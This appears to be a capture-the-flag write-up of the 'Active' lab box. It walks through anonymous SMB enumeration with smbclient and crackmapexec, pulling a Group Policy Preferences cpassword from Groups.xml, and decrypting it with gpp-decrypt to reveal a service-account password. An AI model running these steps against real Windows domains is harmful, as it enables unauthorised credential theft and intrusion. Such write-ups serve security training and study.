
Exposed smb server, anonymous login.

The samba server had these disks listed with  ```smbclient -L```
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------        -------
        ADMIN$                                             NO ACCESS      Remote Admin
        C$                                                      NO ACCESS      Default share
        IPC$                                                   NO ACCESS      Remote IPC
        NETLOGON                                       NO ACCESS      Logon server share 
        Replication                                        READ ONLY
        SYSVOL                                             NO ACCESS       Logon server share 
        Users                                                 NO ACCESS

With further enumeration and spidering was able to extract the following files:
%% (The anonymous spider command: crackmapexec smb 10.10.10.100 -u guest -p "" --share 'Users' -M spider_plus) %%

```json
{
    "Replication": {
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "23 Bytes"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "119 Bytes"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "1.07 KB"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "533 Bytes"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "2.72 KB"
        },
        "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "22 Bytes"
        },
        "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "3.63 KB" 
        }
    }
}
```

The most interesting file is Groups.xml, which contains a hashed password and a username
```
USER:active.htb\SVC_TGS 

HASH:edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

Group Policy Preferences:

Group Policy Preferences (GPP) was introduced in Windows Server 2008, and among many other features, allowed administrators to modify users and groups across their network.  
An example use case is where a company’s gold image had a weak local administrator password,  and administrators wanted to retrospectively set it to something stronger. The defined password was AES-256 encrypted and stored in Groups.xml. However, at some point in 2012 Microsoft published the AES key on MSDN, meaning that passwords set using GPP are now trivial to crack and considered low hanging fruit.

Cracking the hash with the command  ```gpp-decrypt hash_value```
We get the password:  ```GPPstillStandingStrong2k18```
